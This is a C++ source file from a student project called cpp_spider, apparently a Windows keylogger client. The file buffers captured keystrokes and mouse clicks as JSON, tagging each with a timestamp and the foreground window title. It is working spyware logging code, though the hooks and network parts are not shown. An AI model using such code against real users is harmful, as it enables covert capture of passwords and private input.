/*
** Data.cpp for cpp_spider in /home/gogo/rendu/cpp_spider/client/src/Data.cpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 22:10:57 2017 Gauthier Cler
** Last update Sun Oct 08 22:10:57 2017 Gauthier Cler
*/

#include    <windows.h>
#include    <chrono>
#include    <sstream>
#include    <fstream>
#include	<iostream>
#include	"Data.hpp"

Client::Data &Client::Data::get() {
	static Data instance;

	return instance;
}

void Client::Data::logData(const std::string &data, DataType type) {

	long long int timestamp = std::chrono::duration_cast<std::chrono::milliseconds>(
			std::chrono::system_clock::now().time_since_epoch()).count();
	boost::property_tree::ptree tree;
	std::string process;
	char buffer[4096];

	GetWindowText(GetForegroundWindow(), buffer, 4096);
	process.assign(buffer);

	tree.put("timestamp", timestamp);
	tree.put("process", process);
	if (type == DataType::KEY) {
		tree.put("data", data);
		tree.put("type", "KEYSTROKE");
	} else {
		std::vector<std::string> tokens;

		boost::split(tokens, data, boost::is_any_of("\t "));
		tree.put("data.click", tokens.at(0));
		tree.put("data.x", tokens.at(1));
		tree.put("data.y", tokens.at(2));
		tree.put("type", "MOUSE");
	}

	this->lockLogAccessor();
	try {
		if (_logs.size() && _logs.back().get<std::string>("type") == "KEYSTROKE" && type == DataType::KEY) {
			_logs.back().put("data", _logs.back().get<std::string>("data") + tree.get<std::string>("data"));
		} else {
			_logs.push_back(tree);
		}
	} catch (std::exception &e) {
		std::cout << "Error : " << e.what() << std::endl;
	}

	this->unlockLogAccessor();
}

void Client::Data::lockLogAccessor() {
	_logAccessor.lock();
}

void Client::Data::unlockLogAccessor() {
	_logAccessor.unlock();
}

std::string Client::Data::extractLog() {
	std::ostringstream		string;

	BOOST_FOREACH(boost::property_tree::ptree log, _logs) {
	  boost::property_tree::json_parser::write_json(string, log);
	}
	_logs.clear();

	try {
		std::string data(string.str());
		if (data.length()) {
			if (data.back() == '\n') {
				data.pop_back();
			}
		}
		return std::move(data);
	} catch (std::exception &e) {
		std::cout << "Error in extract log : " << e.what() << std::endl;
	}
	return (std::string(""));
}